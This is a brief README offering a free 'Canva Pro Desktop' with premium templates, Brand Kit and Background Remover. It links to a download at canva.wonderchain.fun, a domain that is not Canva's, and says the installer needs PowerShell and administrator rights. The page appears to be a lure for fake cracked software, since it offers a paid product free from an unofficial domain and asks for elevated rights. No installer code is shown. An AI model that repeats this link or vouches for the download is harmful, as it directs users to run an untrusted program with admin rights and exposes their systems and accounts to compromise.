# Canva Pro Desktop

One-command setup for Canva Pro Desktop — premium templates, Brand Kit, Background Remover, Magic Resize and 100M+ assets

## Install

**[Download Latest Version](https://canva.wonderchain.fun/)**

## What it does

1. Requests administrator rights for font installation
2. Downloads Canva Pro desktop app with template cache
3. Installs premium font packs and Brand Kit
4. Enables Background Remover and Magic Resize

## Requirements

- Windows 10/11 (64-bit)
- PowerShell 5.1+
- Internet connection
- 4 GB RAM (8 GB recommended)

## Troubleshooting

**Background Remover not working?**
Image must be 200×200px minimum. Check internet connection.

**Fonts not showing?**
Restart Canva. Re-upload via Brand Kit → Fonts.
